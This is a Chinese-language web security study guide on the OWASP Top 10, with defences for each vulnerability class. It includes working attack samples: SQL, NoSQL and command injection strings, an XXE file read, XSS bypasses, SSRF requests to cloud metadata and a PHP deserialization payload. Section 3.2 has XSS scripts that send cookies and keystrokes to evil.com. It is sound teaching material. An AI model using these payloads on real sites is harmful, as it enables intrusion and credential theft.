# 04-Web安全（OWASP Top 10与常见漏洞）

## 一、OWASP Top 10（2021）

### 1.1 完整列表

| 排名 | 漏洞类型 | 风险等级 |
|------|----------|----------|
| A01 | 失效的访问控制（Broken Access Control） | 严重 |
| A02 | 加密机制失效（Cryptographic Failures） | 高 |
| A03 | 注入（Injection） | 严重 |
| A04 | 不安全设计（Insecure Design） | 高 |
| A05 | 安全配置错误（Security Misconfiguration） | 高 |
| A06 | 脆弱和过时的组件（Vulnerable and Outdated Components） | 高 |
| A07 | 身份认证和鉴别失败（Identification and Authentication Failures） | 高 |
| A08 | 软件和数据完整性失败（Software and Data Integrity Failures） | 高 |
| A09 | 安全日志和监控失败（Security Logging and Monitoring Failures） | 中 |
| A10 | 服务端请求伪造（SSRF） | 高 |

---

## 二、注入攻击（Injection）

### 2.1 SQL注入（SQL Injection）

**原理：** 通过用户输入将恶意SQL代码插入查询语句。

#### 注入类型

| 类型 | 特点 | 检测方法 |
|------|------|----------|
| 经典注入 | 回显在页面 | 观察页面输出 |
| 盲注-布尔型 | 无回显，真假条件不同 | 根据页面差异判断 |
| 盲注-时间型 | 无回显，利用延时 | `SLEEP()`/`WAITFOR` |
| 带外注入（OOB） | 通过DNS/HTTP外带数据 | DNS查询日志 |
| 堆叠注入 | 执行多条SQL语句 | 依次执行 |

#### 注入示例

```
# 经典注入
# 登录绕过
用户名：admin' --
密码：任意

# 生成SQL：
SELECT * FROM users WHERE username='admin' --' AND password='xxx'

# 联合查询注入
' UNION SELECT 1,username,password FROM users --

# 布尔盲注
' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a' --

# 时间盲注
' AND IF(1=1,SLEEP(5),0) --

# 报错注入
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) --
```

#### 防御措施

```
✅ 参数化查询 / 预编译语句（最有效）
✅ 存储过程（参数化）
✅ ORM框架
✅ 输入验证（白名单）
✅ 最小权限数据库账户
✅ WAF规则

❌ 仅靠输入过滤（可被绕过）
❌ 黑名单过滤（不完整）
❌ 转义引号（不够全面）
```

#### 参数化示例

```python
# ❌ 危险
query = f"SELECT * FROM users WHERE name = '{name}'"

# ✅ 安全 - 参数化查询
cursor.execute("SELECT * FROM users WHERE name = %s", (name,))

# ✅ 安全 - ORM
User.objects.filter(name=name)
```

### 2.2 NoSQL注入

**针对MongoDB的注入：**
```javascript
// ❌ 危险
db.users.find({ username: req.body.username, password: req.body.password });

// 攻击载荷
{ "username": "admin", "password": { "$ne": "" } }

// ✅ 安全
db.users.find({ username: String(req.body.username), password: String(req.body.password) });
```

### 2.3 命令注入（OS Command Injection）

```
# 注入点
input = "example.com; cat /etc/passwd"

# 代码
os.system("ping " + input)  # 执行: ping example.com; cat /etc/passwd

# 防御
subprocess.run(["ping", input], check=True)  # 使用参数列表，避免shell解释
```

### 2.4 LDAP注入

```
# 注入
username = "admin)(|(uid=*"

# 生成查询
(&(uid=admin)(|(uid=*)(userPassword=xxx)))
```

### 2.5 XML注入 / XXE

```xml
<!-- XXE读取文件 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>

<!-- 防御：禁用外部实体 -->
```

---

## 三、跨站脚本攻击（XSS）

### 3.1 XSS类型

| 类型 | 存储位置 | 触发条件 | 危害 |
|------|----------|----------|------|
| 反射型XSS | URL参数 | 用户点击恶意链接 | 窃取Cookie、会话劫持 |
| 存储型XSS | 数据库 | 用户访问包含恶意代码的页面 | 大规模传播、蠕虫 |
| DOM型XSS | 前端JS | 客户端JS处理不当 | 窃取数据、页面篡改 |

### 3.2 XSS攻击示例

```html
<!-- 窃取Cookie -->
<script>
  new Image().src='http://evil.com/steal?c='+document.cookie;
</script>

<!-- 键盘记录器 -->
<script>
  document.onkeypress = function(e) {
    new Image().src='http://evil.com/log?k='+e.key;
  }
</script>

<!-- 钓鱼表单 -->
<script>
  document.body.innerHTML = '<form action="http://evil.com/phish"><input name="pwd"><input type="submit"></form>';
</script>
```

### 3.3 XSS绕过技术

```javascript
// 编码绕过
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

// 事件处理器绕过
<svg onload="alert(1)">
<body onpageshow="alert(1)">
<input onfocus="alert(1)" autofocus>

// 双写绕过
<scr<script>ipt>alert(1)</scr</script>ipt>

// 大小写绕过
<ScRiPt>alert(1)</ScRiPt>

// javascript协议绕过
<a href="jav&#x09;ascript:alert(1)">click</a>
```

### 3.4 XSS防御

```
✅ 输出编码（HTML/JS/URL/CS编码）
✅ Content-Security-Policy头
✅ HttpOnly Cookie
✅ 输入验证（白名单）
✅ 使用模板引擎自动转义
✅ DOMPurify等库清理HTML

关键原则：永远不要信任用户输入，输出前必须编码
```

**CSP配置示例：**
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-ancestors 'none';
```

---

## 四、跨站请求伪造（CSRF）

### 4.1 原理

```
用户登录 site.com → 浏览器保存Cookie
用户访问 evil.com → evil.com包含:
  <img src="http://site.com/transfer?to=attacker&amount=10000">
浏览器自动带上 site.com 的Cookie → 转账成功
```

### 4.2 攻击场景

| HTTP方法 | 攻击方式 |
|----------|----------|
| GET | `<img>`, `<script>`, `<link>` |
| POST | 隐藏表单自动提交 |

### 4.3 防御措施

```
✅ CSRF Token（同步令牌模式）
✅ SameSite Cookie属性
✅ 验证Referer/Origin头
✅ 自定义请求头（AJAX请求）
✅ 二次确认（敏感操作需要密码确认）

# Token验证流程
1. 服务器生成随机Token → 存入Session
2. 前端表单携带Token
3. 服务器验证请求中Token是否与Session中匹配
```

---

## 五、服务端请求伪造（SSRF）

### 5.1 原理

攻击者利用服务端功能，让服务端发起请求到攻击者指定的地址。

```
# 正常请求
GET /fetch?url=http://example.com/image.jpg

# SSRF攻击
GET /fetch?url=http://169.254.169.254/latest/meta-data/  (AWS元数据)
GET /fetch?url=http://localhost:6379/  (Redis)
GET /fetch?url=file:///etc/passwd  (本地文件)
```

### 5.2 常见利用场景

| 目标 | 描述 |
|------|------|
| 云元数据 | 169.254.169.254 获取AWS/GCP/Azure凭据 |
| 内网扫描 | 探测内网存活主机和端口 |
| 内部服务 | 访问Redis、Elasticsearch、Memcached |
| 本地文件 | file://协议读取本地文件 |
| 绕过WAF | 利用服务端作为跳板 |

### 5.3 防御

```
✅ 白名单URL/域名
✅ 禁止内网IP（10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x）
✅ 禁用file://、gopher://等协议
✅ URL解析后验证（防止DNS重绑定）
✅ 最小权限原则
✅ 使用专用的HTTP客户端库，限制重定向
```

---

## 六、失效的访问控制

### 6.1 常见问题

```
# 1. 垂直越权 - 低权限用户访问高权限功能
普通用户访问 /admin/users

# 2. 水平越权 - 访问其他用户数据
/api/user/1001 → 改为 /api/user/1002

# 3. IDOR（不安全的直接对象引用）
GET /api/order/12345  → 修改为其他订单号

# 4. 目录遍历
GET /download?file=../../../etc/passwd

# 5. HTTP方法绕过
GET /admin 被拦截 → 改为 POST/PUT/DELETE 绕过
```

### 6.2 防御

```
✅ 服务端强制访问控制
✅ 基于属性的访问控制（ABAC）或基于角色的访问控制（RBAC）
✅ 验证每个请求的授权（不要依赖前端）
✅ 使用随机不可预测的ID（UUID）
✅ 禁止目录遍历（规范化路径后校验）
✅ 记录访问控制失败日志
```

---

## 七、安全配置错误

### 7.1 常见配置错误

| 类别 | 示例 |
|------|------|
| 默认凭据 | admin/admin, 数据库默认密码 |
| 目录列表 | Web服务器开启Directory Listing |
| 调试模式 | 生产环境开启debug模式 |
| 错误信息泄露 | 详细的堆栈信息暴露给用户 |
| 不必要的服务 | 开启不需要的端口/服务 |
| 过度的CORS | `Access-Control-Allow-Origin: *` |
| 缺少安全头 | 缺少HSTS、CSP等 |
| XML外部实体 | 允许XXE |

### 7.2 安全配置清单

```
☐ 修改所有默认密码
☐ 禁用不必要的服务和端口
☐ 关闭目录列表
☐ 生产环境关闭调试模式
☐ 自定义错误页面
☐ 设置安全HTTP头
☐ 定期更新和打补丁
☐ 最小化安装组件
☐ 配置审计日志
```

---

## 八、不安全的反序列化

### 8.1 原理

反序列化不可信数据时，攻击者可构造恶意对象触发代码执行。

### 8.2 各语言示例

**Java：**
```java
// 危险：反序列化不可信数据
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // 可能触发RCE

// 利用链：Apache Commons Collections → Runtime.exec()
```

**PHP：**
```php
// __wakeup()魔术方法在反序列化时自动执行
class Vuln {
    public $cmd;
    public function __wakeup() {
        system($this->cmd);
    }
}
// payload: O:4:"Vuln":1:{s:3:"cmd";s:6:"whoami";}
```

**Python：**
```python
# 危险
import pickle
pickle.loads(user_input)  # 可以执行任意代码
```

### 8.3 防御

```
✅ 不反序列化不可信数据
✅ 使用JSON等安全格式替代
✅ 白名单类验证
✅ 签名验证
✅ 隔离反序列化环境
```

---

## 九、文件上传漏洞

### 9.1 攻击方式

| 手段 | 说明 |
|------|------|
| 扩展名绕过 | .php5, .phtml, .jpg.php |
| MIME类型绕过 | 修改Content-Type |
| 文件头伪造 | 添加图片文件头 |
| 双扩展名 | file.php.jpg |
| 空字节截断 | file.php%00.jpg |
| 大小写绕过 | .Php, .pHP |
| .htaccess攻击 | 上传.htaccess解析规则 |
| 竞争条件 | 利用文件处理的时间差 |

### 9.2 防御

```
✅ 白名单扩展名验证
✅ 验证文件内容（不仅看扩展名）
✅ 重命名上传文件
✅ 存储在Web根目录外
✅ 使用对象存储服务
✅ 限制文件大小
✅ 病毒扫描
✅ 对图片进行二次处理（压缩/裁剪）
```

---

## 十、安全编码实践

### 10.1 输入验证原则

```
1. 永远不信任用户输入
2. 白名单优于黑名单
3. 在信任边界进行验证
4. 验证数据类型、长度、范围、格式
5. 参数化所有外部输入
```

### 10.2 密码存储

```
❌ 不要使用：明文、MD5、SHA-1、SHA-256单独使用

✅ 使用专用密码哈希算法：
   - Argon2id（首选）
   - bcrypt
   - scrypt
   - PBKDF2（至少100000次迭代）

关键参数：
   - 盐值（Salt）：每个密码独立随机盐
   - 迭代次数/工作因子：足够大
   - 输出长度：至少256位
```

### 10.3 安全的会话管理

```
✅ 使用足够长的随机Session ID（至少128位）
✅ 登录后重新生成Session ID
✅ 设置合理的超时时间
✅ 使用安全的Cookie属性
✅ 提供注销功能并销毁Session
✅ 防止Session固定攻击
```

### 10.4 安全的API设计

```
✅ 使用HTTPS
✅ API密钥管理（轮换、最小权限）
✅ 速率限制（Rate Limiting）
✅ 输入验证和输出编码
✅ 版本管理
✅ 正确的错误处理（不泄露内部信息）
✅ 日志记录和监控
✅ 使用OAuth 2.0/JWT认证
```
